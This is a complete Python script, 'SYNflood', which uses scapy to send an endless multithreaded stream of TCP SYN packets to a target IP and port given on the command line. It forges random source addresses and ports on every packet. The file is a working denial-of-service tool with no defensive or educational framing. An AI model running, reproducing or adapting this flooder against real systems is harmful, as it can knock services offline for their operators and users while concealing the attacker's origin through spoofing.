#!/usr/bin/env python
#########################################
# 
# SYNflood - A multithreaded SYN Flooder
# author: arthurnn
#
#
#########################################
import socket, random, sys, threading
from scapy.all import *

if len(sys.argv) != 3:
	print "Usage: %s <Target IP> <Port>" % sys.argv[0]
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

total = 0
conf.iface='en1';#network card XD

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

print "Flooding %s:%i with SYN packets." % (target, port)
while 1:
	sendSYN().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
